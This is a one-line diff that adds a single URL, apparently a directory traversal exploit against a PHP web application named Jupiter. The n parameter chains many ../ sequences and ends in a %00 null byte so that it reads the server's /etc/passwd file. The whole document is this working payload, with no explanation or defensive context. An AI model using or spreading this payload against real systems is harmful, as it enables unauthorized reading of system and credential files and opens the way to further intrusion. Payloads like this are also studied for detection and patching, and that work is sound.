@@ -1,0 +1,1 @@
+http://www.example.com/Jupiter/index.php?n=/../../../../../../../../../../etc/passwd%00
